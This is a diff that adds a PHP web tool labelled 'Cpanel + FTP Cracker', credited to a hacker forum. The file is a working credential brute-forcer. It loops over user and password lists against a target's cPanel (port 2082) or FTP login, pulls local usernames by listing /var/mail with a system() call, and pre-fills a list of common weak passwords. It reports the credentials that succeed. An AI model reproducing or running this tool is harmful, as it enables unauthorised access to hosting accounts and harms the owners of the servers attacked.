@@ -1,0 +1,170 @@
+<?
+/*||||||||||||||||||||||||||||||||||||||||||||*/
+#   Coded By Crazy_Hacker                     |
+#   Script: Cpanel + FTP Cracker              |
+#   Site: www.0day.com                        |
+#   Forums: http://forums.0day.com/index.php  |
+/*|||||||||||||||||||||||||||||||||||||||||||*/
+
+
+if($auth == 1) {
+if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
+   {
+   header('WWW-Authenticate: Basic realm="cih-iq.org"');
+   header('HTTP/1.0 401 Unauthorized');
+   exit("<b>Wrong user or pass !!</b>");
+   }
+}
+
+$connect_timeout=5;
+set_time_limit(0);
+$submit=$_REQUEST['submit'];
+$users=$_REQUEST['users'];
+$pass=$_REQUEST['passwords'];
+$target=$_REQUEST['target'];
+$cracktype=$_REQUEST['cracktype'];
+
+
+if($target == ""){
+$target = "localhost";
+}
+
+?>
+<html>
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+</head>
+<title>Cpanel + FTP Cracker</title>
+<body text="#00FF00" bgcolor="#000000" vlink="#008000" link="#008000" alink="#008000">
+<div align="center">
+<form method="POST" style="border: 1px solid #000000">
+<table width="67%" style="border: 2px dashed #1D1D1D; background-color: #000000; color:#C0C0C0">
+<tr><td align=center>
+ <font face="Courier New" size=4 color=yellow>Cpanel + FTP Cracker</font>
+</td></tr>
+</table>
+<br />
+<?php
+function ftp_check($host,$user,$pass,$timeout){
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "ftp://$host");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
+curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
+curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
+curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+curl_setopt($ch, CURLOPT_FAILONERROR, 1);
+$data = curl_exec($ch);
+if ( curl_errno($ch) == 28 ) { print "<b><font face=\"Verdana\" style=\"font-size: 9pt\">
+<font color=\"#AA0000\">Error :</font> <font color=\"#008000\">Connection Timeout
+Please Check The Target Hostname .</font></font></b></p>";exit;}
+elseif ( curl_errno($ch) == 0 ){
+print "<table width='67%' style='border: 2px dashed #1D1D1D; background-color: #000000; color:#C0C0C0'><tr><td align=center><b><font face=\"Tahoma\" color=\"#FF0000\">[+]</font><font>
+Cracking Success With Username (</font><font color=\"#FF0000\">$user</font><font>) and Password (</font><font color=\"#FF0000\">$pass</font><font color=\"#008000\">)</font></b></td></tr></table>";}curl_close($ch);}
+function cpanel_check($host,$user,$pass,$timeout){
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "http://$host:2082");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
+curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
+curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+curl_setopt($ch, CURLOPT_FAILONERROR, 1);
+$data = curl_exec($ch);
+if ( curl_errno($ch) == 28 ) { print "<b><font face=\"Verdana\" style=\"font-size: 9pt\">
+<font color=\"#AA0000\">Error :</font> <font color=\"#008000\">Connection Timeout
+Please Check The Target Hostname .</font></font></b></p>";exit;}
+elseif ( curl_errno($ch) == 0 ){
+print "<table width='67%' style='border: 2px dashed #1D1D1D; background-color: #000000; color:#C0C0C0'><tr><td align=center><b><font face=\"Tahoma\" color=\"#FF0000\">[+]</font><font>
+Cracking Success With Username (</font><font color=\"#FF0000\">$user</font><font>) and Password (</font><font color=\"#FF0000\">$pass</font><font color=\"#008000\">)</font></b></td></tr></table>";}curl_close($ch);}
+if(isset($submit) && !empty($submit)){
+if(empty($users) && empty($pass)){ print "<p><font face=\"Tahoma\" size=\"2\"><b><font color=\"#FF0000\">Error : </font>Please Check The Users or Password List Entry . . .</b></font></p>"; exit; }
+if(empty($users)){ print "<p><font face='Tahoma' size='2'><b><font color='#FF0000'>Error : </font>Please Check The Users List Entry . . .</b></font></p>"; exit; }
+if(empty($pass) ){ print "<p><font face='Tahoma' size='2'><b><font color='#FF0000'>Error : </font>Please Check The Password List Entry . . .</b></font></p>"; exit; };
+$userlist=explode("\n",$users);
+$passlist=explode("\n",$pass);
+print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]#</font><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#FF0000\">
+Cracking Process Started, Please Wait ...</font></b><br><br>";
+foreach ($userlist as $user) {
+$pureuser = trim($user);
+foreach ($passlist as $password ) {
+$purepass = trim($password);
+if($cracktype == "ftp"){
+ftp_check($target,$pureuser,$purepass,$connect_timeout);
+}
+if ($cracktype == "cpanel")
+{
+cpanel_check($target,$pureuser,$purepass,$connect_timeout);
+}
+}
+}
+}
+?><?
+                                 if($_POST['enter']){
+echo "<form method=POST action=''><table width='67%' style='border: 2px dashed #1D1D1D; background-color: #000000; color:#C0C0C0'>
+                <tr>
+                        <td> <br />
+        <p align='center'><b><font color='#FF0000'>
+                <span lang='en-us'>Server's IP</span> :</font><font face='Arial'>
+        </font><font face='Arial' color='#CC0000'>
+        <input type='text' name='target' size='16' value=$target style='border: 2px dashed #1D1D1D; background-color: #000000; color:#C0C0C0'></font></b></p>
+        <p align='center'><b><font color='#008000' face='Tahoma' size='2'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font></b></p>
+                        <div align='center'>
+                                <table width='55%' style='border: 2px dashed #1D1D1D; background-color: #000000; color:#C0C0C0'>
+                                        <tr>
+                                                <td align='center'>
+                                                                                                <span lang='en-us'><font color='#FF0000'><b>Username</b></font></span></td>
+                                                <td>
+                                                <p align='center'>
+                                                                                                <span lang='en-us'><font color='#FF0000'><b>Password</b></font></span></td>
+                                        </tr>
+                                </table>
+
+                        <p align='center'>&nbsp;<textarea rows='20' name='users' cols='25' style='border: 2px dashed #1D1D1D; background-color: #000000; color:#C0C0C0'>";
+
+      system('ls /var/mail');
+
+echo "</textarea><textarea rows='20' name='passwords' cols='25' style='border: 2px dashed #1D1D1D; background-color: #000000; color:#C0C0C0'>123123\n123456\n1234567\n12345678\n123456789\n159159\n112233\n332211\n1478963\n1478963.\ncpanel\npassword\nuser\npasswd\npasswords\n159357\n357951\n114477\npass\nPassword</textarea><br>
+        <br>
+                               <b> <font font color='#FF0000'>
+                                                Guess options</font></b><font style='font-size: 12pt;' size='-3' face='Verdana'><span style='font-size: 9pt;'>&nbsp;
+                                                <font face='Tahoma'>
+                                                <input name='cracktype' value='cpanel' style='font-weight: 700;' checked type='radio'></font></span></font><b><font size='2' face='Tahoma'>
+                                                Cpanel</font><font size='2' color='#cc0000' face='Tahoma'>
+                                                </font><font size='2' color='#FFFFFF' face='Tahoma'>
+                                                (2082)</font></b><font size='2' face='Tahoma'><b> </b>
+                                                </font>
+                                                <font style='font-size: 12pt;' size='-3' face='Verdana'>
+                                                <span style='font-size: 9pt;'><font face='Tahoma'>
+                                                <input name='cracktype' value='ftp' style='font-weight: 700;' type='radio'></font></span></font><font style='font-weight: 700;' size='2' face='Tahoma'>
+                                                </font><span style='font-weight: 700;'>
+                                                <font size='2' face='Tahoma'>Ftp </font>
+                                                <font size='2' color='#FFFFFF' face='Tahoma'>
+                                                (21)</font></span></p>
+        <p align='center'><option value='name'>&nbsp;&nbsp;&nbsp;&nbsp;
+        <input type='submit' value='   Crack it !   ' name='submit' style='color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000'></p>
+                        </td>
+                </tr>
+        </table>
+
+    <p align='center'></td>
+  </tr>
+  </form>
+  <table width='67%' style='border: 2px dashed #1D1D1D; background-color: #000000; color:#C0C0C0'>
+<tr><td align=center>
+ <font face='Courier New' size=2 color=yellow>[Coded By Crazy_Hacker]<br />Copyright reserved to 0day.com (Security Lov3rz)</font>
+</td></tr>
+</table>
+  ";die();
+}
+?>
+ <table width='67%' style='border: 2px dashed #1D1D1D; background-color: #000000; color:#C0C0C0'>
+<tr><td align=center><form method=POST action='' align=center><br /><input type=submit name=enter value=" Enter " style='color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000' /></form></td></tr></table><br />
+
+
+<table width="67%" style="border: 2px dashed #1D1D1D; background-color: #000000; color:#C0C0C0">
+<tr><td align=center>
+ <font face="Courier New" size=2 color=yellow>[Coded By Crazy_Hacker]<br />Copyright reserved to 0day.com (Security Lov3rz)</font>
+</td></tr>
+</table>
+
+?>
